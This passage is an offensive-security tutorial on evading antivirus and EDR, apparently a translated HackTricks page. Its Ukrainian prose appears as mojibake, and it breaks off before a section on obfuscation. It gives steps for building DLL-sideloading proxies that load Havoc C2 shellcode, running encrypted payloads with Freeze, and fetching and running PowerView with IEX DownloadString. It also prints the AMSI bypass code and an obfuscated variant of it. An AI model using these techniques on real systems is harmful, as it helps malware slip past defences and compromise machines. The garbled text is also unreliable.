–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è DLL –°–∞–π–¥–ª–æ–∞–¥—ñ–Ω–≥—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [Siofra](https://github.com/Cybereason/siofra) —Ç–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π PowerShell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

–¶—è –∫–æ–º–∞–Ω–¥–∞ –≤–∏–≤–µ–¥–µ —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–≥—Ä–∞–º, —è–∫—ñ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è –∞—Ç–∞–∫–∞–º –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è DLL —É "C:\Program Files\\" —Ç–∞ DLL-—Ñ–∞–π–ª–∏, —è–∫—ñ –≤–æ–Ω–∏ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏.

–Ø –Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é **–¥–æ—Å–ª—ñ–¥–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è –∞—Ç–∞–∫–∞–º –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è DLL, —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ**, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–æ—Å–∏—Ç—å —Ö–∏—Ç—Ä–∞, —è–∫—â–æ –≤–æ–Ω–∞ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º, –∞–ª–µ —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –ø—É–±–ª—ñ—á–Ω–æ –≤—ñ–¥–æ–º—ñ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è –∞—Ç–∞–∫–∞–º –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è DLL, –≤–∞—Å –º–æ–∂—É—Ç—å –ª–µ–≥–∫–æ –≤–ø—ñ–π–º–∞—Ç–∏.

–ü—Ä–æ—Å—Ç–æ —Ä–æ–∑–º—ñ—Å—Ç–∏–≤—à–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π DLL –∑ —ñ–º'—è–º, —è–∫–µ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –≤–∞—à–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î –¥–µ—è–∫—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ü—å–æ–≥–æ DLL. –î–ª—è –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ü—ñ—î—ó –ø—Ä–æ–±–ª–µ–º–∏ –º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ —ñ–Ω—à—É —Ç–µ—Ö–Ω—ñ–∫—É, —è–∫–∞ –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è **–ø—Ä–æ–∫—Å—ñ-–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º DLL**.

**–ü—Ä–æ–∫—Å—ñ-–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è DLL** –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –≤–∏–∫–ª–∏–∫–∏, —è–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–∞ —Ä–æ–±–∏—Ç—å –∑ –ø—Ä–æ–∫—Å—ñ (—Ç–∞ –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ) DLL –¥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ DLL, —Ç–∏–º —Å–∞–º–∏–º –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–∏ —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ–±—Ä–æ–±–∫–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

–Ø –±—É–¥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) –≤—ñ–¥ [@flangvik](https://twitter.com/Flangvik/)

–û—Å—å –∫—Ä–æ–∫–∏, —è–∫—ñ —è –≤–∏–∫–æ–Ω–∞–≤:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

–û—Å—Ç–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∞ –Ω–∞–¥–∞—Å—Ç—å –Ω–∞–º 2 —Ñ–∞–π–ª–∏: —à–∞–±–ª–æ–Ω –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É DLL —Ç–∞ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω–∏–π DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

–û—Å—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

–Ø–∫ –Ω–∞—à —à–µ–ª–ª-–∫–æ–¥ (–∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [SGN](https://github.com/EgeBalci/sgn)) —Ç–∞–∫ —ñ –ø—Ä–æ–∫—Å—ñ-–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –º–∞—é—Ç—å –æ—Ü—ñ–Ω–∫—É –≤–∏—è–≤–ª–µ–Ω–Ω—è 0/26 –≤ [antiscan.me](https://antiscan.me)! –Ø –± –Ω–∞–∑–≤–∞–≤ —Ü–µ —É—Å–ø—ñ—Ö–æ–º.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
–Ø **–Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é** –≤–∞–º –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ [twitch VOD –≤—ñ–¥ S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) –ø—Ä–æ –±—ñ—á–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL —Ç–∞ —Ç–∞–∫–æ–∂ [–≤—ñ–¥–µ–æ –≤—ñ–¥ ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ç–µ, –ø—Ä–æ —â–æ –º–∏ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–∏ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze - —Ü–µ –Ω–∞–±—ñ—Ä —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –æ–±—Ö–æ–¥—É EDR –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∏–∑—É–ø–∏–Ω–µ–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤, –ø—Ä—è–º–∏—Ö —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤ —Ç–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏—Ö –º–µ—Ç–æ–¥—ñ–≤ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Freeze –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ —à–µ–ª–ª-–∫–æ–¥—É –Ω–µ–∑–∞–º—ñ—Ç–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
–£—Ö–∏–ª–µ–Ω–Ω—è - —Ü–µ –ª–∏—à–µ –≥—Ä–∞ –≤ –∫–æ—Ç–∞ —Ç–∞ –º–∏—à—É, —Ç–µ, —â–æ –ø—Ä–∞—Ü—é—î —Å—å–æ–≥–æ–¥–Ω—ñ, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–æ –∑–∞–≤—Ç—Ä–∞, —Ç–æ–º—É –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø–æ–∫–ª–∞–¥–∞–π—Ç–µ—Å—è –ª–∏—à–µ –Ω–∞ –æ–¥–∏–Ω —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫—â–æ —Ü–µ –º–æ–∂–ª–∏–≤–æ, —Å–ø—Ä–æ–±—É–π—Ç–µ –ª–∞–Ω—Ü—é–∂–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤ —É—Ö–∏–ª–µ–Ω–Ω—è.
{% endhint %}

## AMSI (–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è)

AMSI –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è "[–±–µ–∑—Ñ–∞–π–ª–æ–≤–æ–º—É —à–∫—ñ–¥–ª–∏–≤–æ–º—É –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–º—É –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—é](https://en.wikipedia.org/wiki/Fileless\_malware)". –°–ø–æ—á–∞—Ç–∫—É –ê–í –º–æ–≥–ª–∏ —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –ª–∏—à–µ **—Ñ–∞–π–ª–∏ –Ω–∞ –¥–∏—Å–∫—É**, —Ç–æ–º—É —è–∫—â–æ –≤–∏ —è–∫–æ—Å—å –º–æ–≥–ª–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤–∞–Ω—Ç–∞–∂–∏ **–ø—Ä—è–º–æ –≤ –ø–∞–º'—è—Ç—ñ**, —Ç–æ –ê–í –Ω–µ –º—ñ–≥ –±–∏ –Ω—ñ—á–æ–≥–æ –∑—Ä–æ–±–∏—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–µ –º–∞–≤ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ—ó –≤–∏–¥–∏–º–æ—Å—Ç—ñ.

–§—É–Ω–∫—Ü—ñ—è AMSI —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∞ –≤ —Ü—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ Windows.

* –ö–æ–Ω—Ç—Ä–æ–ª—å –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∞–±–æ UAC (–ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è EXE, COM, MSI –∞–±–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è ActiveX)
* PowerShell (—Å—Ü–µ–Ω–∞—Ä—ñ—ó, —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–∞ –¥–∏–Ω–∞–º—ñ—á–Ω–∞ –æ—Ü—ñ–Ω–∫–∞ –∫–æ–¥—É)
* Windows Script Host (wscript.exe —Ç–∞ cscript.exe)
* JavaScript —Ç–∞ VBScript
* –ú–∞–∫—Ä–æ—Å–∏ Office VBA

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω–∏–º —Ä—ñ—à–µ–Ω–Ω—è–º –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤, –≤–∏–∫—Ä–∏–≤–∞—é—á–∏ –≤–º—ñ—Å—Ç —Å—Ü–µ–Ω–∞—Ä—ñ—é —É —Ñ–æ—Ä–º—ñ, —è–∫–∞ —î —è–∫ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ—é, —Ç–∞–∫ —ñ –Ω–µ –∑–∞—Ç–µ–º–Ω–µ–Ω–æ—é.

–í–∏–∫–æ–Ω–∞–Ω–Ω—è `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤–∏–Ω–∏–∫–Ω–µ–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è –≤ Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –≤—ñ–Ω –¥–æ–¥–∞—î `amsi:` —ñ –ø–æ—Ç—ñ–º —à–ª—è—Ö –¥–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É, –∑ —è–∫–æ–≥–æ –∑–∞–ø—É—â–µ–Ω–æ —Å—Ü–µ–Ω–∞—Ä—ñ–π, —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É powershell.exe

–ú–∏ –Ω–µ –∑–∞–ª–∏—à–∏–ª–∏ –∂–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª—É –Ω–∞ –¥–∏—Å–∫—É, –∞–ª–µ –≤—Å–µ –æ–¥–Ω–æ –±—É–ª–∏ –≤–∏—è–≤–ª–µ–Ω—ñ –≤ –ø–∞–º'—è—Ç—ñ —á–µ—Ä–µ–∑ AMSI.

–Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ AMSI:

* **–ó–∞—Ç–µ–º–Ω–µ–Ω–Ω—è**

–û—Å–∫—ñ–ª—å–∫–∏ AMSI –≥–æ–ª–æ–≤–Ω–∏–º —á–∏–Ω–æ–º –ø—Ä–∞—Ü—é—î –∑—ñ —Å—Ç–∞—Ç–∏—á–Ω–∏–º–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è–º–∏, —Ç–æ–º—É –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤, —è–∫—ñ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, –º–æ–∂–µ –±—É—Ç–∏ —Ö–æ—Ä–æ—à–∏–º —Å–ø–æ—Å–æ–±–æ–º —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

–û–¥–Ω–∞–∫ AMSI –º–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É–≤–∞—Ç–∏ —Å—Ü–µ–Ω–∞—Ä—ñ—ó –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å –∫—ñ–ª—å–∫–∞ —Ä—ñ–≤–Ω—ñ–≤, —Ç–æ–º—É –∑–∞—Ç–µ–º–Ω–µ–Ω–Ω—è –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–≥–∞–Ω–∏–º –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ —Ü–µ –∑—Ä–æ–±–ª–µ–Ω–æ. –¶–µ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –Ω–µ —Ç–∞–∫–∏–º –ø—Ä—è–º–æ–ª—ñ–Ω—ñ–π–Ω–∏–º –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è. –•–æ—á–∞ —ñ–Ω–æ–¥—ñ –≤—Å–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ –Ω–∞–∑–≤ –∑–º—ñ–Ω–Ω–∏—Ö, —ñ –≤–∏ –±—É–¥–µ—Ç–µ –≤ –ø–æ—Ä—è–¥–∫—É, —Ç–æ–º—É —Ü–µ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ —â–æ—Å—å –±—É–ª–æ –ø–æ–∑–Ω–∞—á–µ–Ω–æ.

* **–û–±—Ö—ñ–¥ AMSI**

–û—Å–∫—ñ–ª—å–∫–∏ AMSI —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π —à–ª—è—Ö–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL —É –ø—Ä–æ—Ü–µ—Å powershell (—Ç–∞–∫–æ–∂ cscript.exe, wscript.exe —Ç–∞ —ñ–Ω.), –º–æ–∂–ª–∏–≤–æ –ª–µ–≥–∫–æ –≤—Ç—Ä—É—Ç–∏—Ç–∏—Å—è –≤ –Ω—å–æ–≥–æ –Ω–∞–≤—ñ—Ç—å –ø—Ä–∏ –∑–∞–ø—É—Å–∫—É —è–∫ –Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á. –ß–µ—Ä–µ–∑ —Ü–µ–π –Ω–µ–¥–æ–ª—ñ–∫ —É —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó AMSI –¥–æ—Å–ª—ñ–¥–Ω–∏–∫–∏ –∑–Ω–∞–π—à–ª–∏ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI.

**–ü—Ä–∏–º—É—Å–æ–≤–∞ –ø–æ–º–∏–ª–∫–∞**

–ü—Ä–∏–º—É—Å–æ–≤–µ –≤–∏–∫–ª–∏–∫–∞–Ω–Ω—è —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó AMSI –Ω–∞ –ø–æ–º–∏–ª–∫—É (amsiInitFailed) –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ —Ç–æ–≥–æ, —â–æ –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–µ –±—É–¥–µ —ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω–æ –∂–æ–¥–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è. –°–ø–æ—á–∞—Ç–∫—É —Ü–µ –±—É–ª–æ —Ä–æ–∑–∫—Ä–∏—Ç–æ [–ú–µ—Ç—Ç–æ–º –ì—Ä–µ–π–±–µ—Ä–æ–º](https://twitter.com/mattifestation), —ñ Microsoft —Ä–æ–∑—Ä–æ–±–∏–ª–∞ –ø—ñ–¥–ø–∏—Å –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —à–∏—Ä–æ–∫–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

–í—Å—å–æ–≥–æ –æ–¥–∏–Ω —Ä—è–¥–æ–∫ –∫–æ–¥—É PowerShell –±—É–≤ –¥–æ—Å—Ç–∞—Ç–Ω—ñ–º, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ AMSI –Ω–µ–ø—Ä–∏–¥–∞—Ç–Ω–∏–º –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É PowerShell. –¶–µ–π —Ä—è–¥–æ–∫, –∑–≤–∏—á–∞–π–Ω–æ –∂, –±—É–≤ –≤—ñ–¥–∑–Ω–∞—á–µ–Ω–∏–π —Å–∞–º–∏–º AMSI, —Ç–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–Ω–µ—Å—Ç–∏ –¥–µ—è–∫—ñ –∑–º—ñ–Ω–∏, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É.

–û—Å—å –º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –æ–±—Ö—ñ–¥ AMSI, —è–∫–∏–π —è –≤–∑—è–≤ –∑ —Ü—å–æ–≥–æ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic n¬∫ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M√Ç¬£n√Ç¬£g' + 'e@+nt.Auto@' + '√Ç¬£tion.A' -join ''
$fdx = '@ms' + '√Ç¬£In√Ç¬£' + 'tF@√Ç¬£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('√Ç¬£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('√Ç¬£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**–ü–∞—Ç—á—É–≤–∞–Ω–Ω—è –ø–∞–º'—è—Ç—ñ**

–¶—é —Ç–µ—Ö–Ω—ñ–∫—É —Å–ø–æ—á–∞—Ç–∫—É –≤—ñ–¥–∫—Ä–∏–≤ [@RastaMouse](https://twitter.com/\_RastaMouse/), —ñ –≤–æ–Ω–∞ –ø–æ–ª—è–≥–∞—î –≤ –ø–æ—à—É–∫—É –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó "AmsiScanBuffer" –≤ amsi.dll (–≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ—ó –∑–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–Ω—è, –Ω–∞–¥–∞–Ω–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º) —Ç–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É —Ü—ñ—î—ó –∞–¥—Ä–µ—Å–∏ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è–º–∏ –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–æ–¥—É –¥–ª—è E\_INVALIDARG, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ñ–∞–∫—Ç–∏—á–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ–≤–µ—Ä–Ω–µ 0, —â–æ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î—Ç—å—Å—è —è–∫ —á–∏—Å—Ç–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç.

{% hint style="info" %}
–ë—É–¥—å –ª–∞—Å–∫–∞, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) –¥–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è.
{% endhint %}

–Ü—Å–Ω—É—é—Ç—å —Ç–∞–∫–æ–∂ —ñ–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –æ–±—Ö—ñ–¥—É AMSI –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º powershell, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**—Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É**](basic-powershell-for-pentesters/#amsi-bypass) —Ç–∞ [—Ü–µ–π —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ–π](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –Ω–∏—Ö.

–ê–±–æ —Ü–µ–π —Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ç—á—É–≤–∞–Ω–Ω—è –ø–∞–º'—è—Ç—ñ –±—É–¥–µ –ø–∞—Ç—á—É–≤–∞—Ç–∏ –∫–æ–∂–µ–Ω –Ω–æ–≤–∏–π Powersh

## –û–±—Ñ—É—Å–∫–∞—Ü—ñ—è

